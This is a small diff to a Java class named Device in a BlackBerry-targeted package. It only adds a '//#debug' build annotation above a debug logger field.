@@ -27,6 +27,7 @@ import com.ht.rcs.blackberry.utils.WChar;
 public final class Device implements Singleton {
 
     /** The debug instance. */
+	//#debug
     private static Debug debug = new Debug("Device", DebugLevel.VERBOSE);
 
     public static final int VERSION = 2010033101;
